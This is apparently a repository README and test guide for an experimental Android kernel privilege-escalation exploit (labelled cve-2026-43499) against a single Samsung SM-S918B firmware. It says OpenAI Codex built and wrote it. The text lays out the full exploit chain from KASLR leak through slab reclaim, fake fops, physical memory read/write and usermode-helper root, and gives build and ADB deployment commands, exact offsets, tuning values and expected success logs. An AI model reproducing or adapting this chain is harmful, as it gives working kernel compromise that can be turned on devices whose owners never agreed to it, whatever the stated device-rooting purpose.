# SM-S918B / S918BXXSAFZF5 experimental payload

> **AI disclosure:** OpenAI Codex recovered and implemented this route, prepared
> the QEMU validation record, and wrote this test guide under `@johnny-salz`'s
> direction. The open rebuild has completed the whole chain on the exact FZF5
> kernel in QEMU. It still needs validation on a real SM-S918B FZF5.

This is an experimental payload for this exact target:

```text
Model:       SM-S918B (dm3q)
Build:       S918BXXSAFZF5
Fingerprint: samsung/dm3qxxx/dm3q:16/BP4A.251205.006/S918BXXSAFZF5:user/release-keys
Kernel:      5.15.189-android13-8-33413713-abS918BXXSAFZF5
```

Do not try it on another firmware. Use it only on a device you own or are
explicitly authorized to test. A failed attempt can panic and reboot the
phone. Wait about one or two minutes after boot before starting a test.

The profile is intentionally absent from `support/targets-v3.json` until a
device owner validates the complete path. The files under `artifacts/` are test
candidates, not a released support-feed entry.

## What changed

The default build now follows the recovered 131072-byte hardware-working
engine:

```text
tracefs sched_blocked_reason KASLR leak
  -> KernelSnitch locates a live mm_struct/order-3 slab
  -> recovered 16+16 Samsung SLUB drain
  -> 0x8e80 AF_UNIX SKB reclaim
  -> rt_sigreturn/FPSIMD writes a compact fake waiter
  -> ashmem fops replacement
  -> mandatory configfs CFI read/write gate
  -> second KernelSnitch/SKB page
  -> verified pipe physical read/write
  -> kernel usermode-helper root stage
```

- `sigreturn` is the default and recovered production writer. It copies a full
  0x200-byte FPSIMD image and puts the waiter at `FPSIMD + 0x18` on the exact
  no-SVE route. The open code also recognizes an SVE record and can use
  `SVE + 0x28`, but that extension is not yet counted as validated.
- `mcast` remains selectable for comparison with the earlier PR #196 route. It
  is not part of the recovered hardware-working engine.
- Each reclaim write is exactly `0x8e80`: a `0xe80` linear SKB head followed by
  one `0x8000` order-3 fragment. The fake fops, lock, waiter, and task land at
  page offsets `0x1180`, `0x1390`, `0x14d0`, and `0x2380`.
- The fops writer runs immediately after the first reclaim. The second page
  search starts only after the new configfs ARW passes its 35-byte write/read
  gate. Reversing those stages loses the reclaimed fops page.

The production payload uses tracefs for the slide. It does not use
`perf_event_open`, a supplied page address, or a QEMU oracle. `boot_id` is an
identity value, not the KASLR leak. Pselect is not a writer backend for this
target.

## Test payload status

The tracked artifacts now contain the recovered closed route. The canonical payload uses SIGRETURN, matching the recovered production engine. MCAST is kept as a separate comparison backend.

| Backend | File | SHA-256 | Size |
| --- | --- | --- | --- |
| SIGRETURN | `artifacts/dm3q-S918BXXSAFZF5/cve-2026-43499-app.so` | `558f051c657c484b5bdf4933ccfabb8be29a85a38fb7d02d46c32903f2d15cdf` | 104128 |
| MCAST | `artifacts/dm3q-S918BXXSAFZF5/cve-2026-43499-app-mcast.so` | `796324701dad319db9b2c1ec08b77909b42ccde251664d6a256a1fa9e805e4e7` | 104128 |

Always record the exact payload SHA-256 with each hardware log. These files are experimental test candidates, not a released support-feed entry.

## Build the recovered route

An Android NDK with an `aarch64-linux-android35-clang` toolchain is required.
The default for this target is now SIGRETURN:

```sh
make TARGET=dm3q-S918BXXSAFZF5 \
  STACK_WRITER=sigreturn \
  OUTDIR=build/dm3q-S918BXXSAFZF5-closed \
  ANDROID_NDK_HOME=/path/to/android-ndk \
  all release
```

The main results are:

```text
build/dm3q-S918BXXSAFZF5-closed/cve-2026-43499-app.so
build/dm3q-S918BXXSAFZF5-closed/cve-2026-43499-app.release.so
build/dm3q-S918BXXSAFZF5-closed/cve-2026-43499-root
```

`STACK_WRITER=mcast` remains available only for an explicit legacy comparison.

## Fast ADB shell test without an APK

This runs the same app payload constructor through the repository's common
`--run-payload` loader. It is useful for a quick end-to-end writer, ARW,
physrw, and root test before rebuilding the APK. It runs as `uid=2000` in the
shell SELinux domain, so it does not prove that the app-domain launch is good.

Build the selected payload and its loader in one command:

```sh
make TARGET=dm3q-S918BXXSAFZF5 \
  STACK_WRITER=sigreturn \
  OUTDIR=build/dm3q-fzf5-shell \
  ANDROID_NDK_HOME=/path/to/android-ndk \
  shell-bundle
```

The two files needed on the phone are:

```text
build/dm3q-fzf5-shell/cve-2026-43499-app.release.so
build/dm3q-fzf5-shell/cve-2026-43499-root
```

On Windows PowerShell, set the exact serial shown by `adb devices`, then push,
verify, and run:

```powershell
$serial = 'YOUR_DEVICE_SERIAL'
$out = 'build\dm3q-fzf5-shell'
$remotePayload = '/data/local/tmp/rmg-s918b-fzf5-app.so'
$remoteRunner = '/data/local/tmp/rmg-cve43499-root'
$remoteLog = '/data/local/tmp/rmg-s918b-fzf5-shell.log'

adb -s $serial push "$out\cve-2026-43499-app.release.so" $remotePayload
adb -s $serial push "$out\cve-2026-43499-root" $remoteRunner
adb -s $serial shell "chmod 0644 $remotePayload; chmod 0755 $remoteRunner; rm -f $remoteLog; toybox sha256sum $remotePayload $remoteRunner"

adb -s $serial shell "EXPLOIT_ATTEMPTS=24 P0_ATTEMPT_TIMEOUT_SEC=45 EXPLOIT_ATTEMPT_TIMEOUT_SEC=120 $remoteRunner --run-payload $remotePayload $remoteRunner $remoteLog"

adb -s $serial pull $remoteLog .\rmg-s918b-fzf5-shell.log
```

The runner mirrors the payload log to the current terminal and keeps the full
copy at `$remoteLog`. If ADB drops, reconnect and pull that file. The app
payload waits until boot uptime reaches 120 seconds, so a command started early
may first print a boot quiet-window wait.

Success has the same stage markers as the APK test, but the last line normally
shows `uid=2000->0` instead of `uid=10000->0`. Test one writer per boot when
kernel state after a failed run is not known. If shell succeeds but APK fails,
the next comparison is app-domain SELinux/seccomp and launch state, not the
shared writer or downstream root chain.

## Test from a locally built Root My Galaxy APK

The current app already accepts `SM-S918B` with kernel `5.15.189` through the
existing `dm3q-S9180ZHS8FZF5` profile. For a local test only, its bundled asset
slot can carry this candidate. This is just a local transport slot: do not
rename or publish the SM-S918B file as the SM-S9180 payload.

On Windows PowerShell, clone both repositories and set their paths:

```powershell
$payloadRepo = 'C:\path\to\Root-My-Galaxy-Payloads'
$appRepo = 'C:\path\to\Root-My-Galaxy'
$assetDir = Join-Path $appRepo 'app\src\main\assets\payloads\dm3q-S9180ZHS8FZF5'
New-Item -ItemType Directory -Force $assetDir | Out-Null
```

Build the recovered SIGRETURN route, then copy its fresh result into the local
app asset slot:

```powershell
Copy-Item -Force `
  (Join-Path $payloadRepo 'build\dm3q-S918BXXSAFZF5-closed\cve-2026-43499-app.release.so') `
  (Join-Path $assetDir 'cve-2026-43499-app.so')
Get-FileHash (Join-Path $assetDir 'cve-2026-43499-app.so') -Algorithm SHA256
```

After selecting one backend, build and install the debug APK:

```powershell
$env:JAVA_HOME = 'C:\Program Files\Android\Android Studio\jbr'
Push-Location $appRepo
.\gradlew.bat :app:assembleDebug
adb install -r .\app\build\outputs\apk\debug\app-debug.apk
Pop-Location
```

Open Root My Galaxy, enable the advanced device selector if needed, select the
Galaxy S23 Ultra profile with kernel `5.15.189`, and run the install flow. Test
one backend per APK build. If kernel state is uncertain after a failed attempt,
reboot and wait one or two minutes before the next run.

## Capture logs

Start logcat before pressing the app button:

```powershell
adb logcat -c
adb logcat -v threadtime > s918b-fzf5-logcat.txt
```

Stop it with Ctrl+C after success, failure, or reboot. For the debug APK, also
extract the payload's own log:

```powershell
adb exec-out run-as dev.busung.s25uroot cat files/exploit.log > s918b-fzf5-exploit.log
```

If the phone rebooted, collect post-crash data that the firmware exposes:

```powershell
adb pull /sys/fs/pstore .\pstore
adb exec-out cat /proc/last_kmsg > s918b-fzf5-last-kmsg.txt
```

Some Samsung builds instead retain
`/data/log/dumpstate_latest_lastkmsg.log.gz`. Upload it if it is readable. A
useful report includes the exact model, build, kernel string, selected backend,
payload SHA-256, full exploit log, full logcat, and any pstore/last-kmsg data.

## Expected log path

The key success markers are:

```text
build config ... stack_writer=sigreturn
slide-kaslr-ok source=tracefs
mm leaked=... base=... object_index=...
sk_buff reclaim sends=.../64 mode=0
kernel page prepare
slide sigreturn returned offset=0x18 ... fpsimd=1 sve=0 ... sched_ok=1
p0 physical write status=0 ok=1
cfi write ret=35
cfi read ret=35
fresh physrw pipe after verified fops page=...
phys step pipe probe found=1
phys step probed read done ok=1
phys step probed write done ok=1
phys step read64 done ok=1
root umh result ... complete=1 retval=0 socket=1
pipe physrw ... done=1 root=1 ... uid=10000->0
```

The app should end with `exploit completed`. The final payload summary must
contain `done=1 root=1`.

## Parameters to tune

All compile-time values below are in
`src/targets/dm3q-S918BXXSAFZF5/target.h`:

| Parameter | Default | What it controls / what to inspect |
| --- | ---: | --- |
| `APPENDED_FUTEXES` | 4096 | KernelSnitch collision amplifier size recovered from the closed route. More work costs memory and time. |
| `REPEAT_MEASUREMENT` | 128 | Repeats per timing sample recovered from the closed route. |
| `AVERAGE` | 8 | Timing aggregate count. Inspect the printed baseline and candidate spread before changing it. |
| `KERNELSNITCH_BASELINE_SAMPLES` | 8 | Baseline sample count. |
| `KERNELSNITCH_BASELINE_QUANTILE` | 1 | Baseline quantile index. |
| `APP_MM_EARLY_DRAIN_TRIGGERS` | 16 | Prepare slabs drained before target release; the remaining 16 are drained after it. |
| `SKB_SEND_SIZE` | 0x8e80 | Exact AF_UNIX send geometry: `0xe80` head plus one `0x8000` fragment. |
| `SKB_RECLAIM_SENDS` | 64 | Maximum reclaim sends used by each page attempt. |
| `PIPE_MAX_ATTEMPTS` | 12 | Second KernelSnitch/pipe preparation attempts. |
| `SIGRETURN_FPSIMD_WAITER_OFF` | 0x18 | Waiter offset in the no-SVE FPSIMD record. |
| `SIGRETURN_SVE_WAITER_OFF` | 0x28 | Experimental SVE-record offset; not part of the recovered closed route. |

`SLIDE_ENTER_DELAY_USEC` (legacy alias: `PSELECT_DELAY_USEC`) controls the
writer-entry delay. `SLIDE_P0_OFFSET` forces a per-boot offset and is unsafe if
guessed wrong; leave it unset for normal tests. Never change several tuning
values at once: preserve the full before/after logs so a result can be
attributed to one change.

## QEMU validation record

The target was rehosted with the exact Samsung kernel image for
`5.15.189-android13-8-33413713-abS918BXXSAFZF5` (raw Image SHA-256
`45e16fc602498f89e8ba5ab6da3109eccf04023bb69e916ab596a903da477bfd`).

The authoritative current-source run is
`boot-payload-closed-20260813-183634.log`. It supplied neither a slide nor an
`mm_struct` address. Tracefs derived the slide and KernelSnitch supplied both
pages. The first pass accepted 57 SKB sends, SIGRETURN used no-SVE offset
`0x18`, configfs returned 35/35 bytes, pipe read/write/read64 passed, UMH root
completed, and the process reported `uid=10000 -> 0` with status 0.

The decisive implementation fix was stage order. The earlier open route found
the pipe page before firing the fops writer, leaving the first reclaimed page
idle for about 30 seconds. The recovered order fires and verifies the writer
first, then starts the second KernelSnitch search.

An SVE-enabled follow-up correctly found the SVE record and selected `+0x28`,
but that attempt failed the reclaim-content gate and panicked on a foreign fake
fops owner. It is not counted as validation of the SVE extension. The exact
closed engine has no SVE branch, so the reproduced production proof is the
full no-SVE route above.
